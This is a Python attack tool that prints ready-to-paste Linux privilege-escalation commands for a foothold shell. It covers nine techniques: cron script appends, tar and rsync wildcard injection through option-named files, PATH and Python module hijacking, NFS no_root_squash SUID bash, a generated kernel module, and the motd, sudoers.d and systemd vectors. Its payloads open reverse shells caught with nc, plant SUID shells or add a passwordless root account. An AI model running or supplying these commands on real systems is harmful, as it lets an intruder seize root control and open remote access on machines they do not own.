#!/usr/bin/env python3
"""LINUX MISCONFIG ACTIONING — the vectors enum.sh only DETECTS.

enum.sh flags writable cron scripts, NFS exports, and odd sudo/SUID PATH use; this turns each
into a concrete exploit. Payloads come from root_actions() in _linpriv_common.py (edit LHOST there).
PRINTS commands you paste into your foothold shell (kmod/nfs also have an attacker-side step).

Usage:
  python3 gen_misc.py cron        [--action revshell|suid_bash|add_root] [--path /writable/script.sh]
  python3 gen_misc.py wildcard    [--action ...] [--tool tar|chown|rsync] [--dir /the/globbed/dir]  # root runs `<tool> *`
  python3 gen_misc.py pathhijack  [--action ...] [--cmd service]        # a root sudo/SUID call resolves a cmd via PATH
  python3 gen_misc.py nfs         [--export /srv/share]                  # no_root_squash export
  python3 gen_misc.py kmod        [--action revshell|add_root]           # cap_sys_module -> load a .ko as ring-0
  python3 gen_misc.py motd        [--action ...] [--file /etc/update-motd.d/00-header]  # runs as root on SSH login
  python3 gen_misc.py sudoersd                                          # writable /etc/sudoers.d -> NOPASSWD rule
  python3 gen_misc.py pythonpath  [--action ...] [--module utils]        # root python imports a module you can plant
  python3 gen_misc.py systemd     [--action ...] [--unit foo.service]    # writable unit -> ExecStart as root
"""
import sys, base64
import _linpriv_common as P

def opt(flag, default=None):
    return sys.argv[sys.argv.index(flag) + 1] if flag in sys.argv else default

def dropscript(body, dst):
    """emit a quote-safe 'write an executable script' line (base64 dodges the payload's own quotes)."""
    b = base64.b64encode(("#!/bin/sh\n" + body + "\n").encode()).decode()
    return f"echo {b} | base64 -d > {dst} && chmod +x {dst}   # base64 = quote-safe payload"

arg = sys.argv[1] if len(sys.argv) > 1 else ""
action  = opt("--action", "revshell")
stage   = opt("--stagedir", P.STAGE).rstrip("/")   # noexec /tmp? --stagedir /dev/shm etc.
revtype = opt("--revtype", None)                   # bash|mkfifo|python|perl|nc

if arg == "cron":
    if action not in P.root_actions(): sys.exit(f"unknown action; pick: {', '.join(P.root_actions())}")
    path = opt("--path", "/path/to/root-cron-script.sh")
    post = P.root_actions(revtype)[action]
    print(f"# WRITABLE CRON SCRIPT run by root   action={action}")
    print("# find it first:  cat /etc/crontab ; ls -la /etc/cron.*/ ; and check the script is writable by you.\n")
    print(f"# 1) confirm you can write the script root's cron runs:")
    print(f"ls -la {path} && test -w {path} && echo WRITABLE\n")
    print(f"# 2) append your payload (runs next time root's cron fires it):")
    print(f"echo '{post}' >> {path}")
    print(f"#    if quoting in the payload fights the script, base64-wrap it instead (quote-free):")
    print(f"echo \"{P.b64sh(post)}\" >> {path}")
    print(f"\n# 3) wait for the cron interval, then:")
    if action == "revshell": print(f"#    catch it:  nc -lvnp {P.LPORT}")
    elif action == "suid_bash": print(f"#    run:  {stage}/.rb -p")
    elif action == "add_root": print(f"#    login:  su r   (no password)")
    print("# no writable script but cron uses a RELATIVE command or a writable dir in its PATH? -> use `pathhijack`.")

elif arg == "wildcard":
    if action not in P.root_actions(): sys.exit(f"unknown action; pick: {', '.join(P.root_actions())}")
    tool = opt("--tool", "tar")
    ddir = opt("--dir", "/the/dir/root/globs")
    post = P.root_actions(revtype)[action]
    print(f"# WILDCARD INJECTION — a root cron/script runs `{tool} ... *` in a dir YOU can write files into.")
    print(f"# the shell expands * to your filenames; {tool} reads filenames that start with '-' as OPTIONS -> arg injection.\n")
    print(f"# spot it:  a root job doing `cd {ddir} && {tool} ... *`  and you can write to {ddir} (ls -ld {ddir}).\n")
    print(f"# 1) drop your payload script + option-named files in {ddir}:")
    print(f"cd {ddir}")
    print(dropscript(post, "sh.sh"))
    if tool == "tar":
        print(r"""echo > '--checkpoint=1'""")
        print(r"""echo > '--checkpoint-action=exec=sh sh.sh'""")
        print(f"#    when root runs `tar ... *`, tar sees the two --checkpoint files as flags -> runs sh.sh as root.")
    elif tool == "chown" or tool == "chmod":
        print(f"#    chown/chmod wildcard: use --reference to flip ownership/bits of a target you control.")
        _verb = "chmod bits" if tool == "chmod" else "ownership"
        print(f"touch x; echo > '--reference=x'   # root's `{tool} -R ... *` then copies x's {_verb} (x is YOURS) onto the files -> then edit them")
        print(f"#    (chown/chmod can't exec directly — use it to take ownership of /etc/passwd-adjacent files, then edit.)")
    elif tool == "rsync":
        print(r"""echo > '-e sh sh.sh'""")
        print(f"#    when root runs `rsync ... *`, the -e file injects a remote-shell -> runs sh.sh as root.")
    else:
        print(f"# unknown --tool '{tool}' (use tar|chown|chmod|rsync)"); sys.exit(1)
    print(f"\n# 2) wait for the root job to run.")
    if action == "revshell": print(f"#    catch it:  nc -lvnp {P.LPORT}")
    elif action == "suid_bash": print(f"#    then:  {stage}/.rb -p")
    elif action == "add_root": print(f"#    then:  su r   (no password)")

elif arg == "pathhijack":
    if action not in P.root_actions(): sys.exit(f"unknown action; pick: {', '.join(P.root_actions())}")
    cmd = opt("--cmd", "service")
    post = P.root_actions(revtype)[action]
    print(f"# PATH HIJACK of a root-run relative command   cmd={cmd}  action={action}")
    print(f"# when a SUID binary or a `sudo -l` rule runs '{cmd}' WITHOUT an absolute path, plant your own '{cmd}' earlier in PATH.\n")
    print(f"# 1) drop a fake '{cmd}' in a writable dir:")
    print(dropscript(post, f"{stage}/{cmd}"))
    print(f"\n# 2) put {stage} first in PATH, then trigger the root binary/sudo rule:")
    print(f'export PATH={stage}:$PATH')
    print(f'sudo /path/to/the/vulnerable_binary        # or run the SUID binary that calls {cmd}')
    print(f"#    ^ it finds {stage}/{cmd} first and runs YOUR script as root.")
    if action == "revshell": print(f"# catch it:  nc -lvnp {P.LPORT}")

elif arg == "nfs":
    export = opt("--export", "/srv/share")
    print(f"# NFS no_root_squash — a share exported with no_root_squash trusts the CLIENT's root.")
    print(f"# you make a SUID-root binary AS ROOT on the attacker, drop it in the share, run it on the target.\n")
    print(f"# 0) find squash setting:  (target) cat /etc/exports    ->  look for 'no_root_squash'")
    print(f"#    (attacker) showmount -e <target>\n")
    print(f"# 1) on the ATTACKER (need local root to make a root-owned SUID file):")
    print(f"sudo mkdir -p /mnt/nfs && sudo mount -o vers=3 <target>:{export} /mnt/nfs")
    print(f"sudo bash -c 'cp /bin/bash /mnt/nfs/.rootbash && chmod 4755 /mnt/nfs/.rootbash'")
    print(f"\n# 2) on the TARGET foothold, the file is now SUID-root — run it:")
    print(f"{export}/.rootbash -p        # -> root shell (euid 0)")
    print(f"# (if you can't get client-root, write a tiny setuid(0) C wrapper instead of copying bash.)")

elif arg == "kmod":
    if action not in ("revshell", "add_root", "suid_bash"): sys.exit("kmod action: revshell | add_root | suid_bash")
    post = P.root_actions(revtype)[action]
    # call_usermodehelper needs argv/envp; run the action via /bin/sh -c.
    esc = post.replace("\\", "\\\\").replace('"', '\\"')
    src = "rootmod.c"
    c = (
        "#include <linux/module.h>\n#include <linux/kmod.h>\n#include <linux/init.h>\n"
        "MODULE_LICENSE(\"GPL\");\n"
        "static int __init m_init(void){\n"
        f'  char *argv[] = {{"/bin/sh","-c","{esc}",NULL}};\n'
        "  static char *envp[] = {\"PATH=/usr/sbin:/usr/bin:/sbin:/bin\",NULL};\n"
        "  call_usermodehelper(argv[0],argv,envp,UMH_WAIT_EXEC);\n"
        "  return 0;\n}\n"
        "static void __exit m_exit(void){}\n"
        "module_init(m_init); module_exit(m_exit);\n"
    )
    open(src, "w").write(c)
    open("Makefile", "w").write("obj-m += rootmod.o\nall:\n\tmake -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules\n")
    print(f"# cap_sys_module (or root-in-a-namespace) -> load a kernel module = ring-0   action={action}")
    print(f"# confirm:  getcap -r / 2>/dev/null | grep cap_sys_module     (or you already hold it)\n")
    print(f"# wrote {src} + Makefile  (init runs your action via call_usermodehelper as ring-0)\n")
    print(f"# 1) build — needs kernel headers for the TARGET kernel (/lib/modules/$(uname -r)/build):")
    print(f"make        # on the target if headers present; else build on a matching kernel and ship rootmod.ko")
    print(f"\n# 2) load it (fires the action), then unload:")
    print(f"insmod ./rootmod.ko ; rmmod rootmod")
    if action == "revshell": print(f"# catch it:  nc -lvnp {P.LPORT}")
    elif action == "add_root": print(f"# then:  su r   (no password)")
    print(f"# NOTE: needs matching kernel headers; a mismatch won't insmod. Loud (module load is audited).")

elif arg == "motd":
    if action not in P.root_actions(): sys.exit(f"unknown action; pick: {', '.join(P.root_actions())}")
    f = opt("--file", "/etc/update-motd.d/00-header")
    post = P.root_actions(revtype)[action]
    print(f"# WRITABLE /etc/update-motd.d/ — scripts here run AS ROOT on every interactive SSH/console login (pam_motd).")
    print(f"# find it:  ls -la /etc/update-motd.d/   (want a script you can write)\n")
    print(f"# 1) confirm writable:  test -w {f} && echo WRITABLE\n")
    print(f"# 2) append your payload to the motd script:")
    print(f"echo '{post}' >> {f}")
    print(f"#    quoting fights? base64-wrap it (quote-free):")
    print(f"echo \"{P.b64sh(post)}\" >> {f}")
    print(f"\n# 3) trigger — log in over SSH (or wait for the next login); the script runs as root:")
    print(f"ssh <user>@<target>        # from the attacker, as any user you have; motd fires on session open")
    if action == "revshell": print(f"#    catch it:  nc -lvnp {P.LPORT}")
    elif action == "add_root": print(f"#    then:  su r   (no password)")
    print(f"# cleanup: remove your line from {f}.")

elif arg == "sudoersd":
    print(f"# WRITABLE /etc/sudoers.d/ — drop a file granting yourself passwordless root.")
    print(f"# find it:  ls -ld /etc/sudoers.d && test -w /etc/sudoers.d && echo DIR-WRITABLE   (or an existing writable file)\n")
    print(f"# 1) drop a clean one-line rule (a syntax error makes sudo IGNORE the whole dir — keep it exact):")
    print(f"echo \"$(whoami) ALL=(ALL) NOPASSWD:ALL\" > /etc/sudoers.d/00x && chmod 440 /etc/sudoers.d/00x")
    print(f"\n# 2) use it:")
    print(f"sudo -n true && sudo -n /bin/bash        # -> root shell, no password")
    print(f"# note: needs write to the DIR (to create) or to an existing file in it. Filename: no '.' / '~' (sudo skips those).")

elif arg == "pythonpath":
    if action not in P.root_actions(): sys.exit(f"unknown action; pick: {', '.join(P.root_actions())}")
    module = opt("--module", "utils")
    post = P.root_actions(revtype)[action]
    # a module runs its top-level code on import -> put the action there.
    body = "import os\nos.system(" + repr(post) + ")\n"
    b = base64.b64encode(body.encode()).decode()
    print(f"# PYTHON MODULE HIJACK — a root-run python script imports '{module}' from a path you can write.")
    print(f"# two ways in: (a) sudo env_keep+=PYTHONPATH, or (b) a writable dir already on the script's sys.path")
    print(f"# (sys.path[0] = the script's OWN dir — if THAT is writable and it does `import {module}`, you win).\n")
    print(f"# 1) build the malicious module (its top-level code runs as root on import):")
    print(f"echo {b} | base64 -d > {stage}/{module}.py")
    print(f"\n# 2a) env_keep+=PYTHONPATH case:")
    print(f"sudo PYTHONPATH={stage} <the-allowed-python-script>")
    print(f"# 2b) writable-dir case: drop {stage}/{module}.py into the script's dir (or any earlier sys.path entry), then let it run.")
    print(f"#     name it EXACTLY after a module the script imports, and ensure your dir precedes the real one.")
    if action == "revshell": print(f"# catch it:  nc -lvnp {P.LPORT}")

elif arg == "systemd":
    if action not in P.root_actions(): sys.exit(f"unknown action; pick: {', '.join(P.root_actions())}")
    unit = opt("--unit", "foo.service")
    post = P.root_actions(revtype)[action]
    esc = post.replace("\\", "\\\\").replace('"', '\\"')
    print(f"# WRITABLE systemd UNIT — a .service/.timer you can edit (or a writable unit dir) runs ExecStart as root.")
    print(f"# find it:  systemctl list-unit-files --state=enabled; ls -la /etc/systemd/system/*.service   (writable? or dir writable?)\n")
    print(f"# 1) point ExecStart at your payload (edit the unit, or drop a new one if the dir is writable):")
    print(f"cat > /etc/systemd/system/{unit} <<'EOF'")
    print(f"[Unit]")
    print(f"Description=x")
    print(f"[Service]")
    print(f"Type=oneshot")
    print(f'ExecStart=/bin/sh -c "{esc}"')
    print(f"[Install]")
    print(f"WantedBy=multi-user.target")
    print(f"EOF")
    print(f"\n# 2) fire it (need the rights, else it runs on its trigger/timer/reboot):")
    print(f"systemctl daemon-reload && systemctl start {unit}    # or: systemctl enable {unit} && reboot")
    if action == "revshell": print(f"# catch it:  nc -lvnp {P.LPORT}")
    elif action == "add_root": print(f"# then:  su r   (no password)")
    print(f"# a writable .timer pointing at a root .service is the same win on a schedule.")

else:
    print("mode must be: cron | wildcard | pathhijack | nfs | kmod | motd | sudoersd | pythonpath | systemd"); sys.exit(1)
